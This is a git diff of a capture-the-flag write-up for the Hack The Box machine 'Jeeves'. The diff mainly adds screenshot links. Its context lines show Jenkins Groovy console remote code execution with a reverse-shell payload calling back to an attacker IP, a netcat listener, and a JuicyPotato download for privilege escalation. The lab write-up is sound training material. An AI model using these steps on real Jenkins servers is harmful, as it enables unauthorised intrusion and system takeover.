@@ -69,6 +69,8 @@ I discovered the directory `/askjeeves`, leading to a Jenkins instance accessibl
 http://jeeves.htb:50000/askjeeves/
 ```
 
+![image](https://github.com/user-attachments/assets/b02e65da-6048-4132-abe5-cc71bb1e5e63)
+
 ---
 
 ## Exploitation via Jenkins
@@ -76,6 +78,9 @@ http://jeeves.htb:50000/askjeeves/
 Jenkins provides a Groovy script console, which allows remote code execution.  
 **Steps**:
 1. Navigate to `Manage Jenkins > Script Console`.
+
+![image](https://github.com/user-attachments/assets/507e695a-54f7-47ac-a78c-f708490cba14)
+
 2. Generate a reverse shell payload using [Reverse Shell Generator](https://www.revshells.com/):
     ```groovy
     String host="<your_IP>";
@@ -94,11 +99,16 @@ Jenkins provides a Groovy script console, which allows remote code execution.
     p.destroy();
     s.close();
     ```
+
+![image](https://github.com/user-attachments/assets/6888660c-dfe1-48f5-aecb-62eba7986519)
+
 3. Start a listener:
     ```bash
     nc -lvnp 9001
     ```
 4. Run the payload in the Jenkins script console.
+
+![image](https://github.com/user-attachments/assets/767fdb96-40fb-4155-88bd-9a8ffe18a953)
 
 **Outcome**: Obtained a reverse shell as a low-privileged user and retrieved the **user flag**.
 
@@ -114,7 +124,7 @@ whoami /priv
 ```
 
 #### Exploitation
-1. **Download JuicyPotato** on a local machine:
+1. **Download JuicyPotato** on your local machine:
    ```bash
    wget "https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe"
    ```
@@ -158,6 +168,8 @@ dir /R
 ```bash
 more < hm.txt:root.txt
 ```
+
+![image](https://github.com/user-attachments/assets/ee7b3388-8040-43b1-ad77-5f56ccfc6885)
 
 ---
 
